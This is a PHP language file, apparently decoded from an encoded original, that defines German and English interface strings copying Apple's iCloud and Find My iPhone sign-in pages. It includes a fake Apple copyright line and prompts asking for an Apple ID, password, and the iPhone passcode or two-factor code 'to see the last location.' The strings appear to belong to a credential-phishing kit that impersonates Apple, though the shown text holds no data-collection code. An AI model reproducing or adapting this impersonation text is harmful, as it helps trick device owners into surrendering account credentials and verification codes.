<?php
/*
 * @ PHP 5.6
 * @ Decoder version : 1.0.0.1
 * @ Release on : 24.03.2018
 * @ Website    : http://EasyToYou.eu
 */

$lang = array();
$lang["PAGE_TITLE"] = "iCloud";
$lang["SETUP_INSTRUCTIONS"] = "Anleitung zum Einrichten";
$lang["HELP"] = "Help";
$lang["MOB_locating"] = "Locating...";
$lang["ALERT1"] = "Authentication Required";
$lang["ALERT2"] = "Enter your Apple ID & password";
$lang["ALERT3"] = "to see the last location.";
$lang["ALERT4"] = "Your Apple ID or password was incorrect.";
$lang["VERIFY"] = "Verify your identity.";
$lang["PROTECTED"] = "Your Apple ID is protected with two-factor authentication.";
$lang["CODESHOWN"] = " Enter the Passcode of your iPhone or verification code shown on your other devices.";
$lang["VERIFYING"] = "Verifying...";
$lang["SIGN_IN_TITLE"] = "Bei iCloud anmelden";
$lang["INCORRECT_ID"] = "Ihre Apple ID oder Ihr Passwort war falsch.";
$lang["APPLE_ID"] = "Apple-ID";
$lang["PASSWORD"] = "Passwort";
$lang["KEEP_ME"] = "Angemeldet bleiben";
$lang["FORGOT_ID"] = "Apple-ID oder Passwort vergessen?";
$lang["DONT_HAVE_ID"] = "Sie haben noch keine Apple-ID? ";
$lang["CREATE_YOURS"] = "Jetzt erstellen";
$lang["Create_Footer"] = "Apple ID erstellen";
$lang["CHECK_ACTIVATION"] = "Status der Aktivierungssperre";
$lang["SYSTEM_STATUS"] = "Systemstatus";
$lang["POLICY"] = "Datenschutz";
$lang["TERMS"] = "Nutzungsbedingungen";
$lang["COPYRIGHT"] = "Copyright © 2020 Apple Inc. Alle Rechte vorbehalten.";
$lang["MOB_PAGE_TITLE"] = "iCloud";
$lang["MOB_FIND"] = "Mein iPhone suchen";
$lang["MOB_APPLE_ID"] = "Apple-ID";
$lang["MOB_EXAMPLE"] = "example@icloud.com";
$lang["MOB_PASSWORD"] = "Passwort";
$lang["MOB_REQUIRED"] = "Erforderlich";
$lang["MOB_LOGIN"] = "Anmelden...";
$lang["MOB_FORGOT_ID"] = "Apple-ID/Passwort vergessen?";
$lang["MOB_SETUP_INSTRUCTIONS"] = "Konfigurationsanweisungen";
$lang["MOB_locating"] = "Suchen ...";
$lang["REMINDERS"] = "Erinnerungen";
$lang["NOTES"] = "Notizen";
$lang["ICLOUD_DRIVE"] = "icloud Laufwerk";
$lang["PHOTOS"] = "Fotos.";
$lang["CONTACTS"] = "Ansprechpartner.";
$lang["MAIL"] = "Mail";
$lang["SETTINGS"] = "Einstellungen";
$lang["FIND_MY_IPHONE"] = "Finde mein iPhone";
$lang["KEYNOTE"] = "Keynote";
$lang["NUMBERS"] = "Nummern";
$lang["FIND_FRIENDS"] = "Freunde finden";
$lang["PAGES"] = "Seiten";
$lang["ALL_DEVICES"] = "Alle Geräte";
$lang["ICLOUD_SETTINGS"] = "icloud Einstellungen";
$lang["SIGN_OUT"] = "Ausloggen";
$lang["LOCATE"] = "Lokalisierung ...";
$lang["WELCOME"] = "Willkommen zu";
$lang["IMPROVE"] = "Verbessern Sie die Wahrscheinlichkeit, Ihre iDevices zu finden, auch wenn sie nicht mit dem Internet verbunden sind.";
$lang["MOMENT"] = "Es kann einige Minuten dauern, bis Sie Ihr verlorenes iPhone gefunden haben.";
$lang["ALL_DEVICES_OFFLINE"] = "Alle Geräte Offline";
$lang["NO_LOCO"] = "Es können keine Standorte angezeigt werden, da alle Geräte offline sind.";

?>